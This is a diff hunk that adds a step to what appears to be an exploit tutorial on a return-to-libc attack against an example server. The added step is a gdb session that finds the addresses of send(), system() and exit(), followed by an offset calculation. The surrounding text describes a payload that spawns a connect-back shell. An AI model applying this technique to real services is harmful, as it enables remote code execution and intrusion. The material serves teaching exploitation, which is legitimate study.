@@ -166,6 +166,34 @@ The malicious data is composed of:
  * the address of the string containing the command to create the connect-back shell, calculated from the leaked _localbuf_ address
  * the string containing the command to create the connect-back shell
 
+To calculate the addresses of _system()_ and _exit()_ from the leaked _send()_ address, we need to calculate the offsets first. So, we load _gdb_, set a breakpoint on _main()_, run the server and issue some commands to get the addresses of _send()_, _system()_ and _exit()_, as follows:
+
+{{{
+$ gdb --quiet ./server 
+Reading symbols from /home/xxx/example1/server...done.
+(gdb) b main
+Breakpoint 1 at 0x8048754: file server.c, line 35.
+(gdb) run
+Starting program: /home/xxx/example1/server 
+
+Breakpoint 1, main () at server.c:35
+35	    libc = dlopen("libc.so", RTLD_LAZY);
+(gdb) p send
+$1 = {<text variable, no debug info>} 0x2098f0 <send>
+(gdb) p system
+$2 = {<text variable, no debug info>} 0x172b20 <system>
+(gdb) p exit
+$3 = {<text variable, no debug info>} 0x1689e0 <exit>
+(gdb) 
+}}}
+
+After obtaining these addresses, we calculate the offsets as follows:
+
+{{{
+system_send_offset = system_addr - send_addr = 0x172b20 - 0x2098f0 = - 0x96dd0
+exit_system_offset = exit_addr - system_addr = 0x1689e0 - 0x172b20 = - 0xa140
+}}}
+
 When the RET instruction of _process_input()_ is processed, it will jump to the _system()_ function, execute the malicious command and return to the _exit()_ function.
 
 == Running the exploit ==
